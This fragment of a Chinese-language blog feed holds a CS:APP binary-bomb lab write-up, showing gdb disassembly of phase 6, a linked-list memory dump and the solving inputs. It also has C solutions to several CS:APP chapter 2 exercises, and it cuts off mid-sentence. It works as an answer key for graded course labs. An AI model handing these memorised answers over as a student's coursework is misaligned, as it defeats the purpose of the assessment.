class="hljs-string">'s'</span></span><br></pre></td></tr></table></figure></p><p>我们由此反解输入，例如’f’在p中下标为9，低四位1001，查表得低4位位1001的字符又’i’，依次进行，解得一组答案为”ionefg”.</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>首先还是<br><figure class="highlight mipsasm hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">disas </span>phase_6</span><br></pre></td></tr></table></figure></p><p>从得出代码可以看出，读入了6个数字，且这6个数字互不相等.<br><figure class="highlight pf hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> function phase_6:</span><br><span class="line"><span class="hljs-number">0</span>x00000000004010f4 <span class="hljs-variable">&lt;+0&gt;</span>:     push   %r14</span><br><span class="line"><span class="hljs-number">0</span>x00000000004010f6 <span class="hljs-variable">&lt;+2&gt;</span>:     push   %r13</span><br><span class="line"><span class="hljs-number">0</span>x00000000004010f8 <span class="hljs-variable">&lt;+4&gt;</span>:     push   %r12</span><br><span class="line"><span class="hljs-number">0</span>x00000000004010fa <span class="hljs-variable">&lt;+6&gt;</span>:     push   %rbp</span><br><span class="line"><span class="hljs-number">0</span>x00000000004010fb <span class="hljs-variable">&lt;+7&gt;</span>:     push   %rbx</span><br><span class="line"><span class="hljs-number">0</span>x00000000004010fc <span class="hljs-variable">&lt;+8&gt;</span>:     sub    <span class="hljs-variable">$0x50</span>,%rsp</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401100 <span class="hljs-variable">&lt;+12&gt;</span>:    mov    %rsp,%r13</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401103 <span class="hljs-variable">&lt;+15&gt;</span>:    mov    %rsp,%rsi</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401106 <span class="hljs-variable">&lt;+18&gt;</span>:    callq  <span class="hljs-number">0</span>x40145c <span class="hljs-variable">&lt;read_six_numbers&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x000000000040110b <span class="hljs-variable">&lt;+23&gt;</span>:    mov    %rsp,%r14</span><br><span class="line"><span class="hljs-number">0</span>x000000000040110e <span class="hljs-variable">&lt;+26&gt;</span>:    mov    <span class="hljs-variable">$0x0</span>,%r12d</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401114 <span class="hljs-variable">&lt;+32&gt;</span>:    mov    %r13,%rbp</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401117 <span class="hljs-variable">&lt;+35&gt;</span>:    mov    <span class="hljs-number">0</span>x0(%r13),%eax</span><br><span class="line"><span class="hljs-number">0</span>x000000000040111b <span class="hljs-variable">&lt;+39&gt;</span>:    sub    <span class="hljs-variable">$0x1</span>,%eax</span><br><span class="line"><span class="hljs-number">0</span>x000000000040111e <span class="hljs-variable">&lt;+42&gt;</span>:    cmp    <span class="hljs-variable">$0x5</span>,%eax</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401121 <span class="hljs-variable">&lt;+45&gt;</span>:    jbe    <span class="hljs-number">0</span>x401128 <span class="hljs-variable">&lt;phase_6+52&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x0000000000401123 <span class="hljs-variable">&lt;+47&gt;</span>:    callq  <span class="hljs-number">0</span>x40143a <span class="hljs-variable">&lt;explode_bomb&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x0000000000401128 <span class="hljs-variable">&lt;+52&gt;</span>:    add    <span class="hljs-variable">$0x1</span>,%r12d</span><br><span class="line"><span class="hljs-number">0</span>x000000000040112c <span class="hljs-variable">&lt;+56&gt;</span>:    cmp    <span class="hljs-variable">$0x6</span>,%r12d</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401130 <span class="hljs-variable">&lt;+60&gt;</span>:    je     <span class="hljs-number">0</span>x401153 <span class="hljs-variable">&lt;phase_6+95&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x0000000000401132 <span class="hljs-variable">&lt;+62&gt;</span>:    mov    %r12d,%ebx</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401135 <span class="hljs-variable">&lt;+65&gt;</span>:    movslq %ebx,%rax</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401138 <span class="hljs-variable">&lt;+68&gt;</span>:    mov    (%rsp,%rax,<span class="hljs-number">4</span>),%eax</span><br><span class="line"><span class="hljs-number">0</span>x000000000040113b <span class="hljs-variable">&lt;+71&gt;</span>:    cmp    %eax,<span class="hljs-number">0</span>x0(%rbp)</span><br><span class="line"><span class="hljs-number">0</span>x000000000040113e <span class="hljs-variable">&lt;+74&gt;</span>:    jne    <span class="hljs-number">0</span>x401145 <span class="hljs-variable">&lt;phase_6+81&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x0000000000401140 <span class="hljs-variable">&lt;+76&gt;</span>:    callq  <span class="hljs-number">0</span>x40143a <span class="hljs-variable">&lt;explode_bomb&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x0000000000401145 <span class="hljs-variable">&lt;+81&gt;</span>:    add    <span class="hljs-variable">$0x1</span>,%ebx</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401148 <span class="hljs-variable">&lt;+84&gt;</span>:    cmp    <span class="hljs-variable">$0x5</span>,%ebx</span><br><span class="line"><span class="hljs-number">0</span>x000000000040114b <span class="hljs-variable">&lt;+87&gt;</span>:    jle    <span class="hljs-number">0</span>x401135 <span class="hljs-variable">&lt;phase_6+65&gt;</span></span><br><span class="line"><span class="hljs-number">0</span>x000000000040114d <span class="hljs-variable">&lt;+89&gt;</span>:    add    <span class="hljs-variable">$0x4</span>,%r13</span><br><span class="line"><span class="hljs-number">0</span>x0000000000401151 <span class="hljs-variable">&lt;+93&gt;</span>:    jmp    <span class="hljs-number">0</span>x401114 <span class="hljs-variable">&lt;phase_6+32&gt;</span></span><br></pre></td></tr></table></figure></p><p>由下面代码可以看出，对输入的6个数进行了映射，<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">    0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">    0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">    0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">    0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</span><br><span class="line">    0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">    0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">    0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br></pre></td></tr></table></figure></p><p>下面的代码，按照输入的6个数映射后的结果，取链表中对应的元素的6个指针放在一个数组中。<br><figure class="highlight pf hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>x000000000040116f <span class="hljs-variable">&lt;+123&gt;</span>:   mov    <span class="hljs-variable">$0x0</span>,%esi</span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401174 <span class="hljs-variable">&lt;+128&gt;</span>:   jmp    <span class="hljs-number">0</span>x401197 <span class="hljs-variable">&lt;phase_6+163&gt;</span></span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401176 <span class="hljs-variable">&lt;+130&gt;</span>:   mov    <span class="hljs-number">0</span>x8(%rdx),%rdx</span><br><span class="line"> <span class="hljs-number">0</span>x000000000040117a <span class="hljs-variable">&lt;+134&gt;</span>:   add    <span class="hljs-variable">$0x1</span>,%eax</span><br><span class="line"> <span class="hljs-number">0</span>x000000000040117d <span class="hljs-variable">&lt;+137&gt;</span>:   cmp    %ecx,%eax</span><br><span class="line"> <span class="hljs-number">0</span>x000000000040117f <span class="hljs-variable">&lt;+139&gt;</span>:   jne    <span class="hljs-number">0</span>x401176 <span class="hljs-variable">&lt;phase_6+130&gt;</span></span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401181 <span class="hljs-variable">&lt;+141&gt;</span>:   jmp    <span class="hljs-number">0</span>x401188 <span class="hljs-variable">&lt;phase_6+148&gt;</span></span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401183 <span class="hljs-variable">&lt;+143&gt;</span>:   mov    <span class="hljs-variable">$0x6032d0</span>,%edx</span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401188 <span class="hljs-variable">&lt;+148&gt;</span>:   mov    %rdx,<span class="hljs-number">0</span>x20(%rsp,%rsi,<span class="hljs-number">2</span>)</span><br><span class="line"> <span class="hljs-number">0</span>x000000000040118d <span class="hljs-variable">&lt;+153&gt;</span>:   add    <span class="hljs-variable">$0x4</span>,%rsi</span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401191 <span class="hljs-variable">&lt;+157&gt;</span>:   cmp    <span class="hljs-variable">$0x18</span>,%rsi</span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401195 <span class="hljs-variable">&lt;+161&gt;</span>:   je     <span class="hljs-number">0</span>x4011ab <span class="hljs-variable">&lt;phase_6+183&gt;</span></span><br><span class="line"> <span class="hljs-number">0</span>x0000000000401197 <span class="hljs-variable">&lt;+163&gt;</span>:   mov    (%rsp,%rsi,<span class="hljs-number">1</span>),%ecx</span><br><span class="line"> <span class="hljs-number">0</span>x000000000040119a <span class="hljs-variable">&lt;+166&gt;</span>:   cmp    <span class="hljs-variable">$0x1</span>,%ecx</span><br><span class="line"> <span class="hljs-number">0</span>x000000000040119d <span class="hljs-variable">&lt;+169&gt;</span>:   jle    <span class="hljs-number">0</span>x401183 <span class="hljs-variable">&lt;phase_6+143&gt;</span></span><br><span class="line"> <span class="hljs-number">0</span>x000000000040119f <span class="hljs-variable">&lt;+171&gt;</span>:   mov    <span class="hljs-variable">$0x1</span>,%eax</span><br><span class="line"> <span class="hljs-number">0</span>x00000000004011a4 <span class="hljs-variable">&lt;+176&gt;</span>:   mov    <span class="hljs-variable">$0x6032d0</span>,%edx</span><br><span class="line"> <span class="hljs-number">0</span>x00000000004011a9 <span class="hljs-variable">&lt;+181&gt;</span>:   jmp    <span class="hljs-number">0</span>x401176 <span class="hljs-variable">&lt;phase_6+130&gt;</span></span><br></pre></td></tr></table></figure></p><p>该链表头指针为$0x6032d0,查看得知该链表元素为<br><figure class="highlight lsl hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p /x <span class="hljs-number">0x6032d0</span></span><br><span class="line">$<span class="hljs-number">1</span> = <span class="hljs-number">0x6032d0</span></span><br><span class="line">(gdb) p /x *<span class="hljs-number">0x6032d0</span></span><br><span class="line">$<span class="hljs-number">2</span> = <span class="hljs-number">0x14c</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x6032d0</span> + <span class="hljs-number">8</span>)</span><br><span class="line">$<span class="hljs-number">3</span> = <span class="hljs-number">0x6032e0</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x6032e0</span>)</span><br><span class="line">$<span class="hljs-number">4</span> = <span class="hljs-number">0xa8</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x6032e0</span> + <span class="hljs-number">8</span>)</span><br><span class="line">$<span class="hljs-number">5</span> = <span class="hljs-number">0x6032f0</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x6032f0</span>)</span><br><span class="line">$<span class="hljs-number">6</span> = <span class="hljs-number">0x39c</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x6032f0</span> + <span class="hljs-number">8</span>)</span><br><span class="line">$<span class="hljs-number">7</span> = <span class="hljs-number">0x603300</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x603300</span>)</span><br><span class="line">$<span class="hljs-number">8</span> = <span class="hljs-number">0x2b3</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x603300</span> + <span class="hljs-number">8</span>)</span><br><span class="line">$<span class="hljs-number">9</span> = <span class="hljs-number">0x603310</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x603310</span>)</span><br><span class="line">$<span class="hljs-number">10</span> = <span class="hljs-number">0x1dd</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x603310</span> + <span class="hljs-number">8</span>)</span><br><span class="line">$<span class="hljs-number">11</span> = <span class="hljs-number">0x603320</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x603320</span>)</span><br><span class="line">$<span class="hljs-number">12</span> = <span class="hljs-number">0x1bb</span></span><br><span class="line">(gdb) p /x *(<span class="hljs-number">0x603320</span> + <span class="hljs-number">8</span>)</span><br><span class="line">$<span class="hljs-number">13</span> = <span class="hljs-number">0x0</span></span><br></pre></td></tr></table></figure></p><p>之后的代码中，可以看出，用按顺序选出的节点指针，建立一个新链表，该链表为降序.<br><figure class="highlight x86asm hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0x00000000004011ab</span> &lt;+<span class="hljs-number">183</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x20</span>(%rsp),%rbx</span><br><span class="line"><span class="hljs-number">0x00000000004011b0</span> &lt;+<span class="hljs-number">188</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x28</span>(%rsp),%rax</span><br><span class="line"><span class="hljs-number">0x00000000004011b5</span> &lt;+<span class="hljs-number">193</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x50</span>(%rsp),%rsi</span><br><span class="line"><span class="hljs-number">0x00000000004011ba</span> &lt;+<span class="hljs-number">198</span>&gt;:   <span class="hljs-keyword">mov</span>    %rbx,%rcx</span><br><span class="line"><span class="hljs-number">0x00000000004011bd</span> &lt;+<span class="hljs-number">201</span>&gt;:   <span class="hljs-keyword">mov</span>    (%rax),%rdx</span><br><span class="line"><span class="hljs-number">0x00000000004011c0</span> &lt;+<span class="hljs-number">204</span>&gt;:   <span class="hljs-keyword">mov</span>    %rdx,<span class="hljs-number">0x8</span>(%rcx)</span><br><span class="line"><span class="hljs-number">0x00000000004011c4</span> &lt;+<span class="hljs-number">208</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x8,%rax</span><br><span class="line"><span class="hljs-number">0x00000000004011c8</span> &lt;+<span class="hljs-number">212</span>&gt;:   <span class="hljs-keyword">cmp</span>    %rsi,%rax</span><br><span class="line"><span class="hljs-number">0x00000000004011cb</span> &lt;+<span class="hljs-number">215</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x4011d2</span> &lt;phase_6+<span class="hljs-number">222</span>&gt;</span><br><span class="line"><span class="hljs-number">0x00000000004011cd</span> &lt;+<span class="hljs-number">217</span>&gt;:   <span class="hljs-keyword">mov</span>    %rdx,%rcx</span><br><span class="line"><span class="hljs-number">0x00000000004011d0</span> &lt;+<span class="hljs-number">220</span>&gt;:   <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x4011bd</span> &lt;phase_6+<span class="hljs-number">201</span>&gt;</span><br><span class="line"><span class="hljs-number">0x00000000004011d2</span> &lt;+<span class="hljs-number">222</span>&gt;:   <span class="hljs-keyword">movq</span>   <span class="hljs-number">$0</span>x0,<span class="hljs-number">0x8</span>(%rdx)</span><br><span class="line"><span class="hljs-number">0x00000000004011da</span> &lt;+<span class="hljs-number">230</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x5,%ebp</span><br><span class="line"><span class="hljs-number">0x00000000004011df</span> &lt;+<span class="hljs-number">235</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x8</span>(%rbx),%rax</span><br><span class="line"><span class="hljs-number">0x00000000004011e3</span> &lt;+<span class="hljs-number">239</span>&gt;:   <span class="hljs-keyword">mov</span>    (%rax),%eax</span><br><span class="line"><span class="hljs-number">0x00000000004011e5</span> &lt;+<span class="hljs-number">241</span>&gt;:   <span class="hljs-keyword">cmp</span>    %eax,(%rbx)</span><br><span class="line"><span class="hljs-number">0x00000000004011e7</span> &lt;+<span class="hljs-number">243</span>&gt;:   <span class="hljs-keyword">jge</span>    <span class="hljs-number">0x4011ee</span> &lt;phase_6+<span class="hljs-number">250</span>&gt;</span><br><span class="line"><span class="hljs-number">0x00000000004011e9</span> &lt;+<span class="hljs-number">245</span>&gt;:   callq  <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="hljs-number">0x00000000004011ee</span> &lt;+<span class="hljs-number">250</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x8</span>(%rbx),%rbx</span><br><span class="line"><span class="hljs-number">0x00000000004011f2</span> &lt;+<span class="hljs-number">254</span>&gt;:   <span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x1,%ebp</span><br><span class="line"><span class="hljs-number">0x00000000004011f5</span> &lt;+<span class="hljs-number">257</span>&gt;:   <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x4011df</span> &lt;phase_6+<span class="hljs-number">235</span>&gt;</span><br></pre></td></tr></table></figure></p><p>要使链表为降序，映射后的6个数应该为3，4，5，6，1，2，那么原输入应该为4，3，2，1，6，5</p><p>到此，二进制炸弹的解码就结束了，改实验具有一定的难度，十分考验逻辑推理和汇编理解能力.</p>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 二进制炸弹 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CS:APP解题记录</title>
      <link href="/2018/11/08/CS:APP%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/11/08/CS:APP%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="CS-APP-2-60"><a href="#CS-APP-2-60" class="headerlink" title="CS:APP 2.60"></a>CS:APP 2.60</h3><a id="more"></a><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">replace_byte</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> x, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> b)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    x = x &amp; (~(<span class="hljs-number">0XFF</span> &lt;&lt; (i &lt;&lt; <span class="hljs-number">3</span>)));<span class="hljs-comment">//相应字节置零</span></span><br><span class="line">    x = x | (b &lt;&lt; (i &lt;&lt; <span class="hljs-number">3</span>));      <span class="hljs-comment">//相应字节改为char b</span></span><br><span class="line">    <span class="hljs-keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> ret = replace_byte(<span class="hljs-number">0X12345678</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0XAB</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0X%X\n"</span>, ret);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>0X1234AB78</code></pre><p>利用按位运算$x \&amp; 1 = x$, $b | 0 = b$。</p><h3 id="Csapp-2-65"><a href="#Csapp-2-65" class="headerlink" title="Csapp 2.65"></a>Csapp 2.65</h3><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">odd_ones</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    x ^= x &gt;&gt; <span class="hljs-number">16</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="hljs-number">8</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="hljs-number">4</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="hljs-number">2</span>;</span><br><span class="line">    x ^= x &gt;&gt; <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> x &amp; <span class="hljs-number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">int</span> x = odd_ones(<span class="hljs-number">0XB</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, x);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>1</code></pre><p>对32位编码，1亦或所有0仍为1，偶数个1连续亦或结果为0，奇数个1连续亦或结果为1。对32位数，按照右移16，8，4，2，1依次右移使得前后各二分之一编码对齐，亦或结果存在后二分之一编码中，直至亦或总结过存于最低位中，结束，取最低位返回。</p><h3 id="Csapp-2-67"><a href="#Csapp-2-67" class="headerlink" title="Csapp 2.67"></a>Csapp 2.67</h3><h4 id="A-在int为w位的机器中，移位长度不应该超过-w-1-。"><a href="#A-在int为w位的机器中，移位长度不应该超过-w-1-。" class="headerlink" title="A.在int为w位的机器中，移位长度不应该超过$w - 1$。"></a>A.在int为w位的机器中，移位长度不应该超过$w - 1$。</h4><h4 id="B"><a href="#B" class="headerlink" title="B"></a>B</h4><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">int_size_is_32</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span> == INT_MIN;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, int_size_is_32());</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>1</code></pre><p>若int为32位,则$1 &lt;&lt; 31 ==$ INT_MIN.</p><h4 id="C"><a href="#C" class="headerlink" title="C"></a>C</h4><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">int_size_is_32_for_16</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">15</span> != INT_MIN) &amp;&amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) == INT_MIN);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, int_size_is_32_for_16());</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>1</code></pre><p>当$1 &lt;&lt; 15 !=$ INT_MIN，证明int非16位后，后面即可判断int是否为32位.</p><h3 id="Csapp-2-68"><a href="#Csapp-2-68" class="headerlink" title="Csapp 2.68"></a>Csapp 2.68</h3><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">lower_one_mask</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(<span class="hljs-number">0XFFFFFFFF</span>u &gt;&gt; (<span class="hljs-number">32</span> - n));</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0X%X\n"</span>, lower_one_mask(<span class="hljs-number">6</span>));</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>0X3F</code></pre><p>将无符号int最大值右移$(32 - 